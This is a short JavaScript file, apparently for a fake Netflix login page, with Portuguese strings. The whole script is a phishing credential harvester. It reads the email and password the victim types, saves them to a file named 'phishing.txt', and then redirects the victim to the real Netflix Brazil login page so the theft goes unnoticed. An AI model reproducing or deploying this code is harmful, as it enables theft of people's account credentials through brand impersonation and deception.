function handler(e) {
    e.preventDefault();

    let email = document.querySelector('#email').value;
    let password = document.querySelector('#password').value;

    let linknet = "https://www.netflix.com/br/login";
    let netflix = document.createElement('a');
    netflix.href = linknet;


    if (email && password) {


        var blob = new Blob(["O email do usuário é:  " + email + " A senha do usuário é:  " + password], { type: "text/plain;charset=utf-8" });
        saveAs(blob, "phishing.txt");


        document.body.appendChild(netflix);
        netflix.click();

    } else {
        alert('Campo de Email ou Senha esta Vazio, Por Favor Preencha!');
    }

}

window.onload = () => {
    const submit = document.querySelector('.form-submit');
    submit.addEventListener('click', handler);
}